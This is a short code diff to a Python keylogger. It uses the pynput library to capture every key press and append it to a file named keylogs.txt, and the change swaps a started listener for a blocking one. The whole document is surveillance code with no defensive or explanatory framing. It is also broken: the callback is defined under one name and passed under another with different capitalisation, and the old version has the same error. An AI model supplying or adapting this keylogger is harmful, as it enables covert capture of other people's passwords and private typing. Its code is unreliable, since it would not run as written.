@@ -1,9 +1,8 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
 
-def onKeyPress(key):
+def on_KeyPress(key):
     with open("keylogs.txt", "a") as file:
         file.write(str(key))
 
-if __name__ == "__main__":
-    listener = Listener(on_press=OnKeyPress)
-    listener.start()
+with Listener(on_press=On_KeyPress) as listener:
+    listener.join()
